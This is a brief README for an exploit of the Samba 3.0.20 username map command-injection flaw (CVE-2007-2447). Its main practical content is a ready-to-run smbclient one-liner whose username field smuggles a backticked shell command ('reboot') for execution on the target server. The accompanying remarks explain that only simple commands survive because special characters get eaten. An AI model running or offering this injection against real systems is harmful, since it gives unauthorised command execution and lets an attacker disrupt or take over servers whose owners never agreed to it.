# smb_usermap
A simple exploit for CVE-2007-2447, present in Samba 3.0.20.

You can exploit this vuln with even less than this, for instance, with smbclient, but I think it's tough to do complex commands, since a lot of special chars probably get eaten, but a simple command (reboot in this case) can be passed like this:

``
smbclient -L <target IP> --user="/=\`reboot\`" -N
``
